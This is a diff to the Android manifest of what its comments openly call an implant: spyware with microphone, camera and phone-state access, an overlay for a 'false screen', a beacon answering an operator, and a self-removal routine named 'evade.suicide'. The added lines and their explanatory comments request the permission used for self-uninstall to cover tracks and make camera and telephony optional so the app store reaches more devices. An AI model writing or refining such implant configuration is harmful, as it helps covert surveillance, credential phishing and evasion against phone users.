@@ -34,6 +34,27 @@
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
+    <!-- The public uninstall API (PackageInstaller.uninstall) documents
+         both DELETE_PACKAGES and REQUEST_DELETE_PACKAGES as its contract.
+         DELETE_PACKAGES is signature|privileged and can never be held by an
+         application a user installs; REQUEST_DELETE_PACKAGES is a normal
+         permission, granted at install without a prompt, and it is what the
+         platform checks in the branch it takes when the caller is neither
+         the device owner nor the installer of record -- the branch that
+         shows the user the confirmation.  The implant removes itself only
+         (evade.suicide), so this is the narrow half of that contract. -->
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+
+    <!-- The hardware the senses want is not the hardware the implant
+         needs.  A phone without a radio, or a tablet without a camera, runs
+         the beacon and answers "the phone has no camera" when the operator
+         asks for one; that answer is already in the code, and required
+         = "false" is the manifest saying the same thing.  Without these
+         two lines the store would filter the application out of every
+         device that lacks either, which is not what the code supports. -->
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.any" android:required="false" />
 
     <!-- The overlay of the false screen.  It is the permission to draw
          over the other applications, and the user of the phone grants it
